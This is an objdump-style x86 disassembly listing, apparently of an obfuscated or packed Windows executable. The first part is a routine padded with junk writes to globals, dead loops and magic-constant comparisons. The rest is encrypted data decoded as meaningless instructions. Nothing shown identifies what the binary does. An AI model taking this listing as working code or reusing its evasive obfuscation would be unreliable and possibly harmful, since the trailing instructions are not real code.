  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x42fa14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x42fa48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     cl,BYTE PTR [ecx+ebp*2-0x477b2c62]
  417977:	jp     0x4179f4
  417979:	call   0xa9bcf51a
  41797e:	sbb    al,0x85
  417980:	(bad)  [esi+0x200a2ab]
  417986:	repz mov esi,0x3ae37030
  41798c:	sub    ebx,edx
  41798e:	div    dh
  417990:	pop    ds
  417991:	push   edi
  417992:	mov    edx,DWORD PTR [esi-0x2a]
  417995:	inc    ebx
  417996:	bound  esi,QWORD PTR [edi]
  417998:	push   esp
  417999:	fadd   DWORD PTR [ecx+0x54]
  41799c:	adc    bl,bh
  41799e:	repnz outs dx,DWORD PTR ds:[esi]
  4179a0:	mov    eax,0x10dde47a
  4179a5:	imul   esi,DWORD PTR [ebx],0x29
  4179a8:	arpl   WORD PTR [esi-0x51],bx
  4179ab:	or     eax,0x71635cf0
  4179b0:	sbb    ecx,ecx
  4179b2:	popa   
  4179b3:	sub    bh,BYTE PTR [edx]
  4179b5:	nop
  4179b6:	mov    al,ds:0x15b7ce33
  4179bb:	add    ebp,DWORD PTR [eax]
  4179bd:	xor    eax,0xc13697c8
  4179c2:	xrelease mov DWORD PTR [esi],ecx
  4179c5:	or     ebp,DWORD PTR [ebp-0x5638eee4]
  4179cb:	iret   
  4179cc:	push   edx
  4179cd:	shr    DWORD PTR [edi+0x66],1
  4179d0:	dec    edx
  4179d1:	sbb    al,0xb8
  4179d3:	push   edi
  4179d4:	sbb    al,0x54
  4179d6:	add    dl,0xf1
  4179d9:	aam    0x77
  4179db:	sub    eax,0xa9e99a77
  4179e0:	push   es
  4179e1:	shl    DWORD PTR [eax+0x5f],cl
  4179e4:	scas   eax,DWORD PTR es:[edi]
  4179e5:	js     0x41796e
  4179e7:	popf   
  4179e8:	lods   eax,DWORD PTR ds:[esi]
  4179e9:	retf   0x3aba
  4179ec:	jo     0x4179f7
  4179ee:	or     DWORD PTR [ebp-0x60e90180],0x75
  4179f5:	or     edi,DWORD PTR [ebx-0x654bc282]
  4179fb:	inc    edi
  4179fc:	jae    0x4179f3
  4179fe:	pop    eax
  4179ff:	jae    0x417981
  417a01:	cld    
  417a02:	les    edi,FWORD PTR [ecx-0x27]
  417a05:	retf   
  417a06:	cli    
  417a07:	dec    esi
  417a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a09:	push   es
  417a0a:	dec    ebp
  417a0b:	stc    
  417a0c:	cmp    ebp,0x2678d013
  417a12:	inc    edi
  417a13:	sbb    ebx,eax
  417a15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a16:	xor    dh,BYTE PTR [esi+edx*2+0x5]
  417a1a:	or     eax,0xec22696c
  417a1f:	ret    0x2b6c
  417a22:	js     0x417a4d
  417a24:	push   ss
  417a25:	add    esp,DWORD PTR [ebx+0x58]
  417a28:	(bad)  
  417a29:	pop    ds
  417a2a:	add    dh,BYTE PTR [edi]
  417a2c:	rol    BYTE PTR ds:0xb17d5e50,cl
  417a32:	jg     0x417a98
  417a34:	add    ebx,0xffffffa3
  417a37:	sbb    eax,0xb2f3162a
  417a3c:	(bad)  
  417a3d:	jecxz  0x417a16
  417a3f:	sbb    ah,BYTE PTR [eax+0x23]
  417a42:	popf   
  417a43:	(bad)  
  417a45:	ficom  WORD PTR [eax]
  417a47:	push   cs
  417a48:	iret   
  417a49:	jmp    0x1dae7666
  417a4e:	loopne 0x417a04
  417a50:	xchg   esp,eax
  417a51:	jne    0x417a31
  417a53:	or     eax,0x2142c03c
  417a58:	shl    ah,0xf7
  417a5b:	sti    
  417a5c:	xchg   ebx,eax
  417a5d:	xor    al,0x5a
  417a5f:	int    0x28
  417a61:	push   ss
  417a62:	pop    edx
  417a63:	scas   al,BYTE PTR es:[edi]
  417a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a65:	push   ecx
  417a66:	mov    esp,ebx
  417a68:	shl    DWORD PTR [ecx+0x18],cl
  417a6b:	and    al,0xbf
  417a6d:	sub    BYTE PTR [edi-0x276d5593],al
  417a73:	bound  edi,QWORD PTR [eax-0x1761ab37]
  417a79:	push   esp
  417a7a:	cmp    DWORD PTR [esi],esp
  417a7c:	jnp    0x417a97
  417a7e:	out    0x14,al
  417a80:	test   BYTE PTR ds:0x7359fed1,dl
  417a86:	xchg   edi,eax
  417a87:	pop    esi
  417a88:	test   DWORD PTR [edx+0x3a],eax
  417a8b:	out    0xc2,al
  417a8d:	bound  ebp,QWORD PTR [edx]
  417a8f:	ret    
  417a90:	xchg   ebx,eax
  417a91:	sbb    dh,BYTE PTR [edx+0x8]
  417a94:	add    ebx,DWORD PTR [ebp+0x2f]
  417a97:	mov    ds:0xaba28ce7,al
  417a9c:	or     al,0x81
  417a9e:	pop    edx
  417a9f:	jne    0x417aab
  417aa1:	cwde   
  417aa2:	sahf   
  417aa3:	pop    esi
  417aa4:	mov    dh,dh
  417aa6:	sub    DWORD PTR [esi-0x77c633ea],0xb90d6021
  417ab0:	std    
  417ab1:	or     dl,BYTE PTR [ebp+0x74bf8bbb]
  417ab7:	cmp    ch,BYTE PTR [ecx+0x49]
  417aba:	push   ds
  417abb:	or     DWORD PTR [ecx-0x36],eax
  417abe:	(bad)  
  417abf:	sub    BYTE PTR [ebp+0x4c],al
  417ac2:	fmul   QWORD PTR [edi-0x55ad572c]
  417ac8:	mov    bh,BYTE PTR [edi]
  417aca:	or     al,0x82
  417acc:	aad    0x69
  417ace:	inc    esp
  417acf:	je     0x417b0c
  417ad1:	jae    0x417b2b
  417ad3:	cmc    
  417ad4:	scas   al,BYTE PTR es:[edi]
  417ad5:	jmp    0x7a1019e1
  417ada:	cmp    cl,BYTE PTR [esi+0x5ca12681]
  417ae0:	cmp    DWORD PTR [edx+ebp*8+0x40],ebp
  417ae4:	sbb    esi,DWORD PTR [edx+0x19]
  417ae7:	mov    al,ds:0x69137f86
  417aec:	jg     0x417af9
  417aee:	retf   
  417aef:	jb     0x417ab0
  417af1:	dec    ecx
  417af2:	mov    bh,0x7a
  417af4:	fcmovnb st,st(3)
  417af6:	sub    al,ah
  417af8:	retf   0x889a
  417afb:	pop    ds
  417afc:	ss pop ebp
  417afe:	ss fprem1 
  417b01:	push   0xffffffc3
  417b03:	cmc    
  417b04:	jnp    0x417b0a
  417b06:	xor    DWORD PTR [eax],esp
  417b08:	out    0x75,al
  417b0a:	xor    DWORD PTR [esi-0x19b813ea],esi
  417b10:	adc    BYTE PTR [edx],bh
  417b12:	aas    
  417b13:	push   eax
  417b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b15:	cli    
  417b16:	(bad)  
  417b17:	jnp    0x417b0c
  417b19:	push   esi
  417b1a:	imul   eax,DWORD PTR [ecx-0x55],0xd8a0377b
  417b21:	mov    esp,0x8cd2119e
  417b26:	mov    ds:0x2a45fb19,al
  417b2b:	or     eax,0xf7640275
  417b30:	add    ebp,DWORD PTR [esi+ebx*2-0x7f5fb909]
  417b37:	unpckhps xmm1,XMMWORD PTR [edx]
  417b3a:	mov    ds:0xc9540f81,eax
  417b3f:	mov    ss,WORD PTR [edi-0xeb7d43]
  417b45:	(bad)  
  417b46:	or     BYTE PTR ds:[eax+0x78],al
  417b4a:	test   BYTE PTR [esi],cl
  417b4c:	jle    0x417bb6
  417b4e:	dec    esi
  417b4f:	add    BYTE PTR [esi+edx*2+0x6323d99c],bl
  417b56:	arpl   bp,di
  417b58:	push   ss
  417b59:	mov    ebp,0x3d99fcd
  417b5e:	ficom  WORD PTR [ebp+0x18]
  417b61:	retf   0x665b
  417b64:	in     al,dx
  417b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b66:	mov    edx,0xb1c18a85
  417b6b:	cmp    al,0xa7
  417b6d:	ja     0x417b1f
  417b6f:	mov    eax,0xf10349a4
  417b74:	mov    eax,0xd4cd3c27
  417b79:	sub    ebx,edi
  417b7b:	or     al,0x6f
  417b7d:	fcom   st(3)
  417b7f:	mov    esi,0x8bbedbc8
  417b84:	cmp    edi,DWORD PTR [edi-0x6a9ee92c]
  417b8a:	inc    esp
  417b8b:	dec    ebp
  417b8c:	cmp    al,0x6
  417b8e:	mov    DWORD PTR [eax-0x41],eax
  417b91:	out    dx,eax
  417b92:	je     0x417be2
  417b94:	xor    al,0x4c
  417b96:	mov    cl,0x56
  417b98:	push   es
  417b99:	dec    edx
  417b9a:	pop    edi
  417b9b:	mov    ss,esp
  417b9d:	sub    edx,edi
  417b9f:	popf   
  417ba0:	test   BYTE PTR [ecx],bl
  417ba2:	test   DWORD PTR fs:[eax],0x864e390c
  417ba9:	pusha  
  417baa:	(bad)  
  417bab:	mov    edi,0xd2570df0
  417bb0:	and    dl,ch
  417bb2:	or     al,cl
  417bb4:	fs js  0x417b59
  417bb7:	stc    
  417bb8:	das    
  417bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bba:	cmp    bh,bl
  417bbc:	sbb    al,0xed
  417bbe:	push   ecx
  417bbf:	daa    
  417bc0:	adc    edi,esp
  417bc2:	jmp    0x417b7c
  417bc4:	xlat   BYTE PTR ds:[ebx]
  417bc5:	add    dl,BYTE PTR [ebx+eiz*2-0x62]
  417bc9:	mov    dl,0xdd
  417bcb:	shl    DWORD PTR [esp+eax*2+0x12],cl
  417bcf:	mov    ebp,0xea9c644a
  417bd4:	mov    eax,0xd7fbc957
  417bd9:	jmp    0xb2a0ca95
  417bde:	mov    esp,0x66077215
  417be3:	xchg   esi,eax
  417be4:	mov    ch,0x43
  417be6:	mov    bh,0x3c
  417be8:	add    eax,0x15604d9d
  417bed:	adc    ebp,0xffffffd4
  417bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bf1:	fwait
  417bf2:	sbb    eax,DWORD PTR [ecx+0x13feb8ee]
  417bf8:	call   0xd856:0xa55ed58b
  417bff:	xchg   esi,eax
  417c00:	dec    ebp
  417c01:	xchg   ebx,eax
  417c02:	adc    BYTE PTR [esi-0x12],al
  417c05:	lock mov al,0xc0
  417c08:	ins    BYTE PTR es:[edi],dx
  417c09:	(bad)  
  417c0a:	xor    BYTE PTR [ecx-0x482c2eb8],ch
  417c10:	imul   ecx,DWORD PTR [ecx+0x3de8315f],0xffffffb8
  417c17:	xchg   BYTE PTR [ebx-0x35f43f86],bh
  417c1d:	pop    esp
  417c1e:	mov    ah,0x4
  417c20:	ins    BYTE PTR es:[edi],dx
  417c21:	xchg   BYTE PTR gs:[ebx],bl
  417c24:	add    al,0x40
  417c26:	dec    eax
  417c27:	sar    DWORD PTR [eax],cl
  417c29:	bound  esi,QWORD PTR [ebp-0x7]
  417c2c:	pop    eax
  417c2d:	xor    al,0xb8
  417c2f:	sub    esp,esi
  417c31:	and    ah,dh
  417c33:	aaa    
  417c34:	pop    esi
  417c35:	sub    al,0xd9
  417c37:	jo     0x417bc1
  417c39:	adc    eax,0xb0a071d1
  417c3e:	arpl   WORD PTR [edi+0x53caca8c],dx
  417c44:	adc    DWORD PTR [edi+0x64],ebp
  417c47:	xor    al,0x36
  417c49:	jmp    0x417c99
  417c4b:	xchg   edx,eax
  417c4c:	pop    ds
  417c4d:	les    esp,FWORD PTR [esi+esi*8-0x42a28f1b]
  417c54:	sahf   
  417c55:	shl    BYTE PTR [ecx-0x7f],0x15
  417c59:	data16 fucom st(5)
  417c5c:	clc    
  417c5d:	(bad)  
  417c5e:	and    eax,0xd7337ea9
  417c63:	or     al,0xfb
  417c65:	das    
  417c66:	(bad)  
  417c67:	pop    ebx
  417c68:	mov    ds:0x10af26e1,eax
  417c6d:	push   esi
  417c6e:	add    edi,edx
  417c70:	mov    bh,0x4d
  417c72:	mov    dh,0xd5
  417c74:	and    DWORD PTR [ebx+0xd],esp
  417c77:	and    ecx,DWORD PTR [eax+eax*2]
  417c7a:	jbe    0x417c23
  417c7c:	mov    eax,gs
  417c7e:	mov    ebx,0xe29d09bc
  417c83:	mov    ah,0x79
  417c85:	pop    ss
  417c86:	ret    0xf3ba
  417c89:	int    0x60
  417c8b:	and    eax,0x8090de5f
  417c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c91:	out    0xd2,al
  417c93:	adc    al,0x76
  417c95:	push   0xf
  417c97:	mov    edi,0x79e19351
  417c9c:	push   cs
  417c9d:	ja     0x417c83
  417c9f:	sub    dl,BYTE PTR [edi+0x5f]
  417ca2:	pusha  
  417ca3:	inc    ecx
  417ca4:	scas   eax,DWORD PTR es:[edi]
  417ca5:	sbb    al,BYTE PTR [ecx]
  417ca7:	fsub   DWORD PTR ds:[esi-0x4c]
  417cab:	lea    edx,[ebp+0x105c9d18]
  417cb1:	inc    esp
  417cb2:	(bad)  
  417cb3:	mov    ah,0x71
  417cb5:	scas   al,BYTE PTR es:[edi]
  417cb6:	ja     0x417cc4
  417cb8:	bound  esp,QWORD PTR [esi+0x53]
  417cbb:	test   DWORD PTR [ecx-0x36135c1f],ecx
  417cc1:	and    cl,BYTE PTR [esi+ebx*8]
  417cc4:	repz (bad) 
  417cc6:	adc    al,0x89
  417cc8:	and    DWORD PTR [esi],esp
  417cca:	cmp    bh,dh
  417ccc:	ja     0x417d21
  417cce:	pop    esp
  417ccf:	jmp    0x417d27
  417cd1:	clc    
  417cd2:	mov    ch,0x35
  417cd4:	sbb    eax,0xb5be456e
  417cd9:	fstp   QWORD PTR [eax-0x48]
  417cdc:	and    DWORD PTR [ebp-0x36343220],0x26e2d9bd
  417ce6:	stos   DWORD PTR es:[edi],eax
  417ce7:	push   0xeba4d236
  417cec:	push   ebx
  417ced:	fcom   DWORD PTR [ecx-0x1]
  417cf0:	in     al,dx
  417cf1:	cmp    eax,0x913e4204
  417cf6:	fisttp WORD PTR [edi+0x11]
  417cf9:	bound  esp,QWORD PTR [eax-0x1d]
  417cfc:	mov    DWORD PTR [ebp+0x746c2533],ecx
  417d02:	cmp    DWORD PTR [ecx+0x11],esi
  417d05:	aam    0x26
  417d07:	push   ebp
  417d08:	repz out dx,al
  417d0a:	fsub   QWORD PTR [esi-0x63]
  417d0d:	mov    bh,BYTE PTR [ebp-0x17]
  417d10:	cmc    
  417d11:	(bad)  
  417d12:	nop
  417d13:	pop    es
  417d14:	xor    al,0xd3
  417d16:	lahf   
  417d17:	je     0x417cde
  417d19:	out    dx,al
  417d1a:	loop   0x417d06
  417d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d1d:	aam    0x93
  417d1f:	mov    edx,0x6870b9a5
  417d24:	push   es
  417d25:	push   0x57
  417d27:	std    
  417d28:	inc    ebp
  417d29:	pushf  
  417d2a:	(bad)  
  417d2c:	(bad)  
  417d2d:	retf   
  417d2e:	loope  0x417d29
  417d30:	outs   dx,DWORD PTR cs:[esi]
  417d32:	sbb    DWORD PTR [esi],eax
  417d34:	outs   dx,BYTE PTR ds:[esi]
  417d35:	lds    ebp,FWORD PTR [edx-0x71f47b0f]
  417d3b:	adc    al,0x51
  417d3d:	rcl    BYTE PTR [edx-0x6e],cl
  417d40:	add    al,0xc6
  417d42:	popa   
  417d43:	rcr    DWORD PTR [ebx+ebp*4],0x42
  417d47:	dec    ecx
  417d48:	stos   BYTE PTR es:[edi],al
  417d49:	scas   eax,DWORD PTR es:[edi]
  417d4a:	popf   
  417d4b:	repnz mul DWORD PTR [eax]
  417d4e:	or     BYTE PTR [edx+0x49e4b84d],bl
  417d54:	outs   dx,BYTE PTR gs:[esi]
  417d56:	ins    DWORD PTR es:[edi],dx
  417d57:	fisub  WORD PTR [edx]
  417d59:	cmp    ecx,DWORD PTR [edi+0x3ca5bde0]
  417d5f:	sbb    ebx,ecx
  417d61:	loopne 0x417d9c
  417d63:	call   DWORD PTR [edi+0x53709c2c]
  417d69:	adc    cl,cl
  417d6b:	imul   ebp,edi,0xffffff9b
  417d6e:	setge  dh
  417d71:	or     ecx,ecx
  417d73:	imul   esp,DWORD PTR [edx+ecx*4+0x67fd7f22],0xffffffdb
  417d7b:	cmp    bh,BYTE PTR [esi+0x38e6d0bf]
  417d81:	inc    edx
  417d82:	sub    ah,BYTE PTR [ebp+0x1a]
  417d85:	pop    ebp
  417d86:	push   0x368774be
  417d8b:	mov    eax,0x736a328b
  417d90:	pop    esi
  417d91:	pop    esp
  417d92:	xor    DWORD PTR [edx],0x5
  417d95:	mov    ebx,0xb96b2ff0
  417d9a:	bound  esp,QWORD PTR [esi]
  417d9c:	mov    ah,0xda
  417d9e:	jno    0x417d80
  417da0:	mov    ebx,0xec4bfd99
  417da5:	sbb    esi,DWORD PTR [ebp-0x44]
  417da8:	adc    BYTE PTR [ecx],dh
  417daa:	and    eax,0x4a274eeb
  417daf:	rol    DWORD PTR [esi-0x4d],0x1a
  417db3:	cmp    al,0x76
  417db5:	mov    ebp,0x71ca7dd0
  417dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dbb:	test   DWORD PTR [edi],0x5e4d1b69
  417dc1:	test   eax,0xa9c3bcc5
  417dc6:	inc    edi
  417dc7:	scas   eax,DWORD PTR es:[edi]
  417dc8:	xchg   ecx,eax
  417dc9:	pop    ss
  417dca:	push   0x24
  417dcc:	sbb    al,0x70
  417dce:	popf   
  417dcf:	add    eax,0x9e947e51
  417dd4:	(bad)  
  417dd7:	stos   DWORD PTR es:[edi],eax
  417dd8:	mov    edi,0x99648536
  417ddd:	ins    BYTE PTR es:[edi],dx
  417dde:	test   DWORD PTR [edi],edi
  417de0:	inc    edx
  417de1:	cmp    eax,0x7122f1cf
  417de6:	mov    ah,0x15
  417de8:	sbb    ebp,ebx
  417dea:	stos   DWORD PTR es:[edi],eax
  417deb:	push   cs
  417dec:	jge    0x417e50
  417dee:	xchg   ecx,eax
  417df0:	cs (bad) 
  417df2:	xchg   esp,eax
  417df3:	jae    0x417dac
  417df5:	stc    
  417df6:	(bad)  
  417df7:	jmp    0x161f8d4d
  417dfc:	std    
  417dfd:	or     DWORD PTR [eax-0x7e],ecx
  417e00:	push   esi
  417e01:	outs   dx,BYTE PTR ds:[esi]
  417e02:	cmp    BYTE PTR [ebx+0x1e],ah
  417e05:	scas   eax,DWORD PTR es:[edi]
  417e06:	pop    esi
  417e07:	adc    eax,0xe2a31281
  417e0c:	ror    DWORD PTR [edi],0x8e
  417e0f:	aad    0x8
  417e11:	adc    bh,BYTE PTR [ecx-0x4debd0c6]
  417e17:	(bad)  
  417e19:	in     eax,dx
  417e1a:	sbb    al,0x87
  417e1c:	sbb    cl,ah
  417e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e1f:	or     BYTE PTR [eax],al
  417e21:	xor    ah,BYTE PTR [esi-0x33]
  417e24:	popf   
  417e25:	cwde   
  417e26:	dec    esi
  417e27:	cmp    ah,bl
  417e29:	push   cs
  417e2a:	jb     0x417e1d
  417e2c:	or     eax,DWORD PTR [eax+0x53b4bf14]
  417e32:	xor    al,0xb9
  417e34:	push   ecx
  417e35:	jg     0x417de6
  417e37:	jno    0x417e80
  417e39:	pop    ebx
  417e3a:	add    bl,BYTE PTR [ebp+0x74aebcc8]
  417e40:	dec    eax
  417e41:	test   eax,0xcd34df3e
  417e46:	jg     0x417e0b
  417e48:	ror    BYTE PTR [esi-0x67],cl
  417e4b:	sub    dl,BYTE PTR [ecx-0x7ac0e6c6]
  417e51:	cmp    ebp,DWORD PTR [esp+edx*8+0x27cd3877]
  417e58:	ret    
  417e59:	add    eax,0x17606b73
  417e5e:	mov    ?,WORD PTR [ebx-0xd]
  417e61:	dec    edi
  417e62:	sbb    edi,0xffffffe7
  417e65:	out    dx,al
  417e66:	or     esi,DWORD PTR [ebp-0x16]
  417e69:	jge    0x417ec1
  417e6b:	cmc    
  417e6c:	pusha  
  417e6d:	test   eax,0xa9ce4ba6
  417e72:	jnp    0x417eaf
  417e74:	inc    edx
  417e75:	xchg   esi,eax
  417e76:	inc    ebp
  417e77:	cmp    DWORD PTR [eax-0x51],edi
  417e7a:	out    0xff,eax
  417e7c:	divps  xmm5,xmm1
  417e7f:	jns    0x417e73
  417e81:	jb     0x417e3b
  417e83:	jbe    0x417e1b
  417e85:	jmp    0xe047e3f4
  417e8a:	xor    ebp,ecx
  417e8c:	or     DWORD PTR [ebx-0x588044f8],ebx
  417e92:	inc    edx
  417e93:	fst    st(0)
  417e95:	jmp    0xc13f:0x6b3829ce
  417e9c:	iret   
  417e9d:	stos   BYTE PTR es:[edi],al
  417e9e:	ins    DWORD PTR es:[edi],dx
  417e9f:	repnz cmp al,0xe
  417ea2:	sub    BYTE PTR [edi-0x2e],dh
  417ea5:	(bad)  
  417ea7:	xchg   BYTE PTR [eax-0x6c],ah
  417eaa:	sbb    eax,0xc2f1b88e
  417eaf:	pop    esi
  417eb0:	or     eax,0x8e10b983
  417eb5:	mov    esi,0xe30531be
  417eba:	loopne 0x417e5f
  417ebc:	jmp    0xa45e9354
  417ec1:	mov    ds:0xf3f2828c,al
  417ec6:	test   ch,0x2d
  417ec9:	and    al,0x91
  417ecb:	inc    ebp
  417ecc:	ret    0x131f
  417ecf:	pushf  
  417ed0:	cld    
  417ed1:	test   ecx,ebp
  417ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ed4:	add    DWORD PTR [edx],ebx
  417ed6:	inc    esi
  417ed7:	call   0x13e5b1f5
  417edc:	cld    
  417edd:	dec    edx
  417ede:	out    dx,al
  417edf:	pop    esp
  417ee0:	sbb    bh,ah
  417ee2:	or     bl,BYTE PTR ss:[edx]
  417ee5:	aam    0x2f
  417ee7:	call   0xaec3:0x855a5812
  417eee:	int    0xb4
  417ef0:	pusha  
  417ef1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef2:	jnp    0x417e9d
  417ef4:	sti    
  417ef5:	inc    esi
